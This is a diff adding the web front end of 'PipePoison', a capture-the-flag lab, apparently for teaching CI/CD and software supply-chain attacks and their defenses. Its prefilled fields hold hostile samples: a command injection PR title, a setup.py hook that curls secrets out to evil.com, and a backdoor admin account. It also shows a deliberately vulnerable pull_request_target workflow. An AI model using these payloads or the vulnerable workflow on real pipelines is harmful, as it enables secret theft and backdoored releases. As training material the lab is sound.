@@ -1,0 +1,719 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PipePoison // CI/CD & Software Supply Chain Security Lab</title>
+  <style>
+    :root {
+      --bg-base: #0a0d14;
+      --bg-card: #111726;
+      --bg-surface: #182238;
+      --border: #243452;
+      --accent: #00f0ff;
+      --accent-dim: rgba(0, 240, 255, 0.15);
+      --danger: #ff0055;
+      --danger-dim: rgba(255, 0, 85, 0.15);
+      --warning: #ffb800;
+      --success: #00ff88;
+      --success-dim: rgba(0, 255, 136, 0.15);
+      --text: #e2e8f0;
+      --text-muted: #8493a8;
+      --font-mono: 'Fira Code', 'Courier New', monospace;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background-color: var(--bg-base);
+      color: var(--text);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      line-height: 1.5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Navbar */
+    header.navbar {
+      background: rgba(17, 23, 38, 0.95);
+      border-bottom: 1px solid var(--border);
+      padding: 0.75rem 1.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      backdrop-filter: blur(10px);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+    }
+    .brand .icon { font-size: 1.5rem; }
+    .brand .title {
+      font-family: var(--font-mono);
+      font-weight: 800;
+      letter-spacing: 2px;
+      color: var(--accent);
+      font-size: 1.25rem;
+      text-shadow: 0 0 10px rgba(0, 240, 255, 0.5);
+    }
+    .brand .version {
+      font-size: 0.75rem;
+      background: var(--bg-surface);
+      color: var(--text-muted);
+      padding: 2px 6px;
+      border-radius: 4px;
+      border: 1px solid var(--border);
+    }
+
+    .status-badges {
+      display: flex;
+      gap: 0.5rem;
+    }
+    .badge {
+      font-size: 0.75rem;
+      font-family: var(--font-mono);
+      padding: 4px 8px;
+      border-radius: 4px;
+      border: 1px solid var(--border);
+      background: var(--bg-card);
+    }
+    .badge.online { color: var(--success); border-color: rgba(0, 255, 136, 0.3); }
+    .badge.runner { color: var(--accent); border-color: rgba(0, 240, 255, 0.3); }
+
+    .flag-tracker {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      background: var(--bg-card);
+      padding: 4px 12px;
+      border-radius: 20px;
+      border: 1px solid var(--border);
+      font-family: var(--font-mono);
+    }
+    .flag-dots { display: flex; gap: 6px; }
+    .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #2a3b5c;
+      transition: all 0.3s ease;
+    }
+    .dot.cleared {
+      background: var(--success);
+      box-shadow: 0 0 8px var(--success);
+    }
+
+    /* Main Layout */
+    .main-layout {
+      display: flex;
+      flex: 1;
+    }
+    aside.sidebar {
+      width: 260px;
+      background: var(--bg-card);
+      border-right: 1px solid var(--border);
+      padding: 1.25rem 0.75rem;
+      display: flex;
+      flex-direction: column;
+      gap: 0.25rem;
+    }
+    .nav-title {
+      font-size: 0.7rem;
+      font-weight: 700;
+      color: var(--text-muted);
+      letter-spacing: 1px;
+      padding: 0.5rem 0.75rem 0.25rem;
+    }
+    .nav-item {
+      background: transparent;
+      border: 1px solid transparent;
+      color: var(--text-muted);
+      padding: 0.6rem 0.85rem;
+      border-radius: 6px;
+      text-align: left;
+      font-size: 0.85rem;
+      cursor: pointer;
+      font-family: inherit;
+      transition: all 0.2s ease;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    .nav-item:hover {
+      background: var(--bg-surface);
+      color: var(--text);
+    }
+    .nav-item.active {
+      background: var(--accent-dim);
+      border-color: rgba(0, 240, 255, 0.4);
+      color: var(--accent);
+      font-weight: 600;
+    }
+
+    main.content-pane {
+      flex: 1;
+      padding: 1.75rem;
+      overflow-y: auto;
+      max-width: 1200px;
+    }
+    .tab-content { display: none; }
+    .tab-content.active { display: block; animation: fadeIn 0.2s ease; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: translateY(0); } }
+
+    .panel-header {
+      margin-bottom: 1.5rem;
+    }
+    .panel-header h2 {
+      font-size: 1.5rem;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    .panel-header p {
+      color: var(--text-muted);
+      font-size: 0.9rem;
+      margin-top: 0.25rem;
+    }
+
+    .card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 1.25rem;
+      margin-bottom: 1.25rem;
+    }
+    .card h3 {
+      font-size: 1.1rem;
+      color: var(--accent);
+      margin-bottom: 0.75rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .card p {
+      font-size: 0.88rem;
+      color: var(--text-muted);
+      margin-bottom: 0.75rem;
+    }
+
+    /* Code & Terminal */
+    pre, code {
+      font-family: var(--font-mono);
+    }
+    pre.code-block {
+      background: #060910;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 1rem;
+      font-size: 0.82rem;
+      color: #a5b4fc;
+      overflow-x: auto;
+      margin-bottom: 1rem;
+    }
+    .terminal-box {
+      background: #05080e;
+      border: 1px solid #1e2d48;
+      border-radius: 6px;
+      padding: 1rem;
+      font-family: var(--font-mono);
+      font-size: 0.82rem;
+      color: #38ef7d;
+      min-height: 160px;
+      max-height: 340px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+    }
+
+    /* Form Inputs */
+    .form-group {
+      margin-bottom: 1rem;
+    }
+    label {
+      display: block;
+      font-size: 0.82rem;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 0.35rem;
+    }
+    input[type="text"], textarea, select {
+      width: 100%;
+      background: #080c16;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 0.6rem 0.85rem;
+      color: #fff;
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+    }
+    input[type="text"]:focus, textarea:focus {
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 0 8px var(--accent-dim);
+    }
+    button.btn {
+      background: var(--accent);
+      color: #050b14;
+      font-weight: 700;
+      padding: 0.6rem 1.25rem;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+      transition: all 0.2s ease;
+    }
+    button.btn:hover {
+      box-shadow: 0 0 12px var(--accent);
+      filter: brightness(1.1);
+    }
+    button.btn-danger {
+      background: var(--danger);
+      color: #fff;
+    }
+    button.btn-danger:hover {
+      box-shadow: 0 0 12px var(--danger);
+    }
+
+    .flag-banner {
+      background: var(--success-dim);
+      border: 1px solid var(--success);
+      color: var(--success);
+      padding: 0.75rem 1rem;
+      border-radius: 6px;
+      font-family: var(--font-mono);
+      font-weight: 700;
+      margin-top: 1rem;
+      display: none;
+    }
+
+    /* Table */
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.85rem;
+    }
+    th, td {
+      border: 1px solid var(--border);
+      padding: 0.6rem 0.8rem;
+      text-align: left;
+    }
+    th {
+      background: var(--bg-surface);
+      color: var(--accent);
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="app-container">
+    <!-- Header -->
+    <header class="navbar">
+      <div class="brand">
+        <span class="icon">⚡</span>
+        <span class="title">PIPEPOISON</span>
+        <span class="version">CI/CD & Supply Chain Lab [Port 8012]</span>
+      </div>
+      <div class="status-badges">
+        <span class="badge online">● VCS: ONLINE</span>
+        <span class="badge runner">RUNNER: worker-01</span>
+        <span class="badge">REGISTRY: octocorp.internal</span>
+      </div>
+      <div class="flag-tracker">
+        <span>FLAGS:</span>
+        <b id="flagCount">0/4</b>
+        <div class="flag-dots">
+          <span class="dot" id="dot1"></span>
+          <span class="dot" id="dot2"></span>
+          <span class="dot" id="dot3"></span>
+          <span class="dot" id="dot4"></span>
+        </div>
+      </div>
+    </header>
+
+    <div class="main-layout">
+      <!-- Sidebar -->
+      <aside class="sidebar">
+        <div class="nav-title">SUPPLY CHAIN KILL CHAIN</div>
+        <button class="nav-item active" data-tab="topo">0. CI/CD Architecture</button>
+        <button class="nav-item" data-tab="stage1">1. Poisoned Pipeline (PPE)</button>
+        <button class="nav-item" data-tab="stage2">2. Dependency Confusion</button>
+        <button class="nav-item" data-tab="stage3">3. Runner Secrets Exfil</button>
+        <button class="nav-item" data-tab="stage4">4. Release Backdoor & SLSA</button>
+        <div class="nav-title" style="margin-top: 1.5rem;">DEFENSE & CONTROLS</div>
+        <button class="nav-item" data-tab="defense">🛡️ Security Policies</button>
+        <button class="nav-item" data-tab="submit">🚩 Flag Verification</button>
+      </aside>
+
+      <!-- Content -->
+      <main class="content-pane">
+        <!-- Tab 0: Topology -->
+        <section id="tab-topo" class="tab-content active">
+          <div class="panel-header">
+            <h2>📦 0. OctoCorp Enterprise CI/CD Topology</h2>
+            <p>소프트웨어 개발 수명주기(SDLC) 전반의 취약 지점과 공격면을 파악합니다.</p>
+          </div>
+          <div class="card">
+            <h3>Enterprise Pipeline Architecture</h3>
+            <pre class="code-block">
+[Attacker PR] ──> [VCS: GitHub/GitLab] ──(pull_request_target)──> [Self-Hosted Runner]
+                      │                                                   │
+                      │ (Secrets Injection)                               │ (pip install)
+                      ▼                                                   ▼
+             [Vault / AWS KMS]                                  [Public PyPI / NPM]
+                      │                                                   │ (Dependency Confusion)
+                      ▼                                                   ▼
+             [Build Artifact] ──(Release Packaging)──> [Deploy Staging / Production]
+            </pre>
+            <p>OctoCorp의 <code>auth-service</code> 리포지토리는 자동화된 CI/CD 파이프라인을 통해 빌드, 테스트, 의존성 설치, 릴리스를 수행합니다. 4개 단계의 취약점을 분석하고 공략하세요.</p>
+          </div>
+        </section>
+
+        <!-- Tab 1: Stage 1 PPE -->
+        <section id="tab-stage1" class="tab-content">
+          <div class="panel-header">
+            <h2>💉 1. Poisoned Pipeline Execution (PPE)</h2>
+            <p>위험한 <code>pull_request_target</code> 트리거와 검증되지 않은 PR 제목/코드 인터폴레이션을 이용해 빌드 러너를 장악합니다.</p>
+          </div>
+          <div class="card">
+            <h3>Vulnerable Workflow (.github/workflows/ci.yml)</h3>
+            <pre class="code-block">
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+jobs:
+  test:
+    runs-on: self-hosted-prod-runner
+    steps:
+      - name: Process PR
+        run: |
+          # DANGEROUS: Direct expression interpolation in bash
+          echo "Processing PR title: ${{ github.event.pull_request.title }}"
+            </pre>
+            <div class="form-group">
+              <label>PR Title (Command Injection Payload):</label>
+              <input type="text" id="prTitleInput" value="fix: oauth ; whoami ; id ; #">
+            </div>
+            <div class="form-group">
+              <label>Workflow Override Script:</label>
+              <input type="text" id="prScriptInput" value="echo 'Injected Code Running' && env">
+            </div>
+            <button class="btn btn-danger" onclick="submitPRAndTrigger()">🚀 Create PR & Trigger CI Runner</button>
+            <div id="stage1Flag" class="flag-banner"></div>
+          </div>
+          <div class="card">
+            <h3>Runner Terminal Output</h3>
+            <div id="runnerTerminal" class="terminal-box">Waiting for pipeline execution...</div>
+          </div>
+        </section>
+
+        <!-- Tab 2: Stage 2 Dependency Confusion -->
+        <section id="tab-stage2" class="tab-content">
+          <div class="panel-header">
+            <h2>📦 2. Dependency Confusion & Typosquatting</h2>
+            <p>내부 비공개 패키지와 동일한 이름으로 공개 PyPI에 고버전(99.0.0)을 배포하여 빌드 시 임의 코드를 실행시킵니다.</p>
+          </div>
+          <div class="card">
+            <h3>Target Dependency</h3>
+            <p>내부 프로젝트 <code>auth-service</code>는 사내 패키지 <code>octocorp-crypto-vault==1.0.0</code>을 사용합니다.</p>
+            <div class="form-group">
+              <label>Target Package Name:</label>
+              <input type="text" id="pkgNameInput" value="octocorp-crypto-vault">
+            </div>
+            <div class="form-group">
+              <label>Public Hijack Version:</label>
+              <input type="text" id="pkgVerInput" value="99.0.0">
+            </div>
+            <div class="form-group">
+              <label>Malicious setup.py install hook:</label>
+              <input type="text" id="pkgHookInput" value="import os; os.system('curl -X POST http://evil.com/exfil?token=runner_compromised')">
+            </div>
+            <button class="btn btn-danger" onclick="publishMaliciousPkg()">📤 Publish to Public PyPI & Trigger Resolver</button>
+            <div id="stage2Flag" class="flag-banner"></div>
+          </div>
+          <div class="card">
+            <h3>Package Resolver Telemetry</h3>
+            <div id="pkgTerminal" class="terminal-box">Awaiting dependency resolution simulation...</div>
+          </div>
+        </section>
+
+        <!-- Tab 3: Stage 3 Secrets Exfiltration -->
+        <section id="tab-stage3" class="tab-content">
+          <div class="panel-header">
+            <h2>🔑 3. CI/CD Runner Secrets Exfiltration</h2>
+            <p>러너 환경변수에 주입된 마스터 <code>VAULT_TOKEN</code> 또는 클라우드 크리덴셜을 공격자 수집기로 탈취합니다.</p>
+          </div>
+          <div class="card">
+            <h3>Attacker Exfiltration Collector</h3>
+            <div class="form-group">
+              <label>Exfiltrated Secret Data (Plaintext or Base64):</label>
+              <input type="text" id="exfilInput" value="s.k8s_octo_prod_master_9921">
+            </div>
+            <button class="btn btn-danger" onclick="sendExfil()">📡 Exfiltrate to Collector</button>
+            <div id="stage3Flag" class="flag-banner"></div>
+          </div>
+          <div class="card">
+            <h3>Collector Ingestion Logs</h3>
+            <div id="exfilTerminal" class="terminal-box">Listening for incoming secret exfiltration packets...</div>
+          </div>
+        </section>
+
+        <!-- Tab 4: Stage 4 Backdoor & SLSA -->
+        <section id="tab-stage4" class="tab-content">
+          <div class="panel-header">
+            <h2>🏷️ 4. Release Artifact Backdooring & SLSA Provenance</h2>
+            <p>빌드 산출물에 관리자 백도어 코드를 삽입하고 SLSA 출처 검증 부재를 악용해 스테이징에 배포합니다.</p>
+          </div>
+          <div class="card">
+            <h3>Release Packaging Pipeline</h3>
+            <p>현재 빌드된 최신 릴리스 아티팩트를 변조합니다.</p>
+            <div class="form-group">
+              <label>Release ID:</label>
+              <input type="text" id="releaseIdInput" value="rel-2.3.9">
+            </div>
+            <div class="form-group">
+              <label>Backdoor Account Payload:</label>
+              <input type="text" id="backdoorPayloadInput" value="backdoor_admin:OctoBackdoor!2026:ROLE_ROOT_ADMIN">
+            </div>
+            <button class="btn btn-danger" onclick="tamperAndDeploy()">💉 Inject Backdoor & Deploy to Staging</button>
+            <div id="stage4Flag" class="flag-banner"></div>
+          </div>
+          <div class="card">
+            <h3>Deployment & Verification Logs</h3>
+            <div id="deployTerminal" class="terminal-box">Waiting for deployment pipeline...</div>
+          </div>
+        </section>
+
+        <!-- Tab 5: Defense Controls -->
+        <section id="tab-defense" class="tab-content">
+          <div class="panel-header">
+            <h2>🛡️ Supply Chain Security Controls</h2>
+            <p>공급망 보안 방어 정책(SLSA v1.0, Sigstore Cosign, Scoped Registries, OIDC Federation)을 활성화합니다.</p>
+          </div>
+          <div class="card">
+            <h3>Hardening Policy Toggles</h3>
+            <div style="display: flex; flex-direction: column; gap: 0.75rem; margin-top: 1rem;">
+              <label><input type="checkbox" id="pol1" onchange="togglePol('sanitize_pr_inputs', this.checked)"> 1. Sanitize PR Inputs & Restrict pull_request_target (Stage 1 Defense)</label>
+              <label><input type="checkbox" id="pol2" onchange="togglePol('scoped_registries_only', this.checked)"> 2. Enforce Scoped Internal Package Registry & Hash Pinning (Stage 2 Defense)</label>
+              <label><input type="checkbox" id="pol3" onchange="togglePol('oidc_short_lived_tokens', this.checked)"> 3. Use OIDC Federation instead of Long-Lived Static Tokens (Stage 3 Defense)</label>
+              <label><input type="checkbox" id="pol4" onchange="togglePol('enforce_slsa_signatures', this.checked)"> 4. Enforce SLSA Level 3 Provenance & Cosign Signatures (Stage 4 Defense)</label>
+            </div>
+          </div>
+        </section>
+
+        <!-- Tab 6: Flag Submit -->
+        <section id="tab-submit" class="tab-content">
+          <div class="panel-header">
+            <h2>🚩 Flag Verification HUD</h2>
+            <p>획득한 4개의 단계별 플래그를 검증하고 최종 100% 침투를 완료하세요.</p>
+          </div>
+          <div class="card">
+            <div class="form-group">
+              <label>Target Stage:</label>
+              <select id="stageSelect">
+                <option value="stage1">Stage 1: Poisoned Pipeline Execution</option>
+                <option value="stage2">Stage 2: Dependency Confusion</option>
+                <option value="stage3">Stage 3: CI/CD Secrets Exfiltration</option>
+                <option value="stage4">Stage 4: Release Backdoor & SLSA</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label>Flag Value:</label>
+              <input type="text" id="flagInput" placeholder="FLAG{...}">
+            </div>
+            <button class="btn" onclick="submitFlag()">Verify Flag</button>
+            <div id="verifyResult" style="margin-top: 1rem; font-family: var(--font-mono);"></div>
+          </div>
+        </section>
+      </main>
+    </div>
+  </div>
+
+  <script>
+    // Tab switching
+    document.querySelectorAll('.nav-item').forEach(btn => {
+      btn.addEventListener('click', () => {
+        document.querySelectorAll('.nav-item').forEach(b => b.classList.remove('active'));
+        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+        btn.classList.add('active');
+        const tab = btn.getAttribute('data-tab');
+        document.getElementById(`tab-${tab}`).classList.add('active');
+      });
+    });
+
+    async function updateStatus() {
+      try {
+        const res = await fetch('/api/status');
+        const data = await res.json();
+        document.getElementById('flagCount').innerText = `${data.solved_count}/4`;
+        for (let i = 1; i <= 4; i++) {
+          const dot = document.getElementById(`dot${i}`);
+          if (data.stages[`stage${i}`]) dot.classList.add('cleared');
+          else dot.classList.remove('cleared');
+        }
+        if (data.policies) {
+          document.getElementById('pol1').checked = data.policies.sanitize_pr_inputs;
+          document.getElementById('pol2').checked = data.policies.scoped_registries_only;
+          document.getElementById('pol3').checked = data.policies.oidc_short_lived_tokens;
+          document.getElementById('pol4').checked = data.policies.enforce_slsa_signatures;
+        }
+      } catch (e) {
+        console.error("Status fetch error", e);
+      }
+    }
+
+    async function submitPRAndTrigger() {
+      const title = document.getElementById('prTitleInput').value;
+      const script = document.getElementById('prScriptInput').value;
+      const term = document.getElementById('runnerTerminal');
+      term.innerText = "[*] Submitting malicious PR and triggering runner...";
+      
+      const prRes = await fetch('/api/vcs/pull-requests', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({title, script_injection: script})
+      });
+      const prData = await prRes.json();
+      
+      const trigRes = await fetch('/api/pipelines/trigger', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({pr_id: prData.pull_request.id})
+      });
+      const trigData = await trigRes.json();
+      term.innerText = trigData.logs;
+      
+      if (trigData.flag) {
+        const f = document.getElementById('stage1Flag');
+        f.innerText = `STAGE 1 CLEARED: ${trigData.flag}`;
+        f.style.display = 'block';
+        submitFlagDirect('stage1', trigData.flag);
+      }
+    }
+
+    async function publishMaliciousPkg() {
+      const name = document.getElementById('pkgNameInput').value;
+      const ver = document.getElementById('pkgVerInput').value;
+      const hook = document.getElementById('pkgHookInput').value;
+      const term = document.getElementById('pkgTerminal');
+      term.innerText = "[*] Publishing malicious dependency to public index...";
+      
+      await fetch('/api/registry/publish-public', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({package_name: name, version: ver, install_hook_script: hook})
+      });
+
+      term.innerText += "\n[*] Simulating runner `pip install`...";
+      const bRes = await fetch('/api/pipelines/build-deps', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({package_name: name})
+      });
+      const bData = await bRes.json();
+      term.innerText = bData.logs;
+      
+      if (bData.flag) {
+        const f = document.getElementById('stage2Flag');
+        f.innerText = `STAGE 2 CLEARED: ${bData.flag}`;
+        f.style.display = 'block';
+        submitFlagDirect('stage2', bData.flag);
+      }
+    }
+
+    async function sendExfil() {
+      const data = document.getElementById('exfilInput').value;
+      const term = document.getElementById('exfilTerminal');
+      term.innerText = "[*] Dispatching secret packet to collector...";
+      
+      const res = await fetch('/api/exfil/collector', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({source: "pipeline_runner_01", data})
+      });
+      const resData = await res.json();
+      term.innerText = `[Collector Ingestion] Logged entry. Total secrets harvested: ${resData.logged_entries}`;
+      
+      if (resData.flag) {
+        const f = document.getElementById('stage3Flag');
+        f.innerText = `STAGE 3 CLEARED: ${resData.flag}`;
+        f.style.display = 'block';
+        submitFlagDirect('stage3', resData.flag);
+      }
+    }
+
+    async function tamperAndDeploy() {
+      const relId = document.getElementById('releaseIdInput').value;
+      const payload = document.getElementById('backdoorPayloadInput').value;
+      const term = document.getElementById('deployTerminal');
+      term.innerText = "[*] Injecting backdoor into release candidate...";
+      
+      await fetch('/api/release/tamper', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({release_id: relId, injected_payload: payload})
+      });
+
+      term.innerText += "\n[*] Deploying modified artifact to staging cluster...";
+      const depRes = await fetch(`/api/release/deploy-test?release_id=${relId}`, {
+        method: 'POST'
+      });
+      const depData = await depRes.json();
+      term.innerText = depData.logs;
+
+      if (depData.flag) {
+        const f = document.getElementById('stage4Flag');
+        f.innerText = `STAGE 4 CLEARED: ${depData.flag}`;
+        f.style.display = 'block';
+        submitFlagDirect('stage4', depData.flag);
+      }
+    }
+
+    async function togglePol(policy, enabled) {
+      await fetch('/api/security/policies', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({policy, enabled})
+      });
+      updateStatus();
+    }
+
+    async function submitFlagDirect(stage, flag) {
+      await fetch('/api/submit-flag', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({stage, flag})
+      });
+      updateStatus();
+    }
+
+    async function submitFlag() {
+      const stage = document.getElementById('stageSelect').value;
+      const flag = document.getElementById('flagInput').value;
+      const out = document.getElementById('verifyResult');
+      
+      const res = await fetch('/api/submit-flag', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({stage, flag})
+      });
+      const data = await res.json();
+      if (data.correct) {
+        out.innerHTML = `<span style="color: var(--success);">✔ ${data.message} (${data.solved_count}/4 solved)</span>`;
+      } else {
+        out.innerHTML = `<span style="color: var(--danger);">✘ ${data.message}</span>`;
+      }
+      updateStatus();
+    }
+
+    // Init
+    updateStatus();
+    setInterval(updateStatus, 5000);
+  </script>
+</body>
+</html>
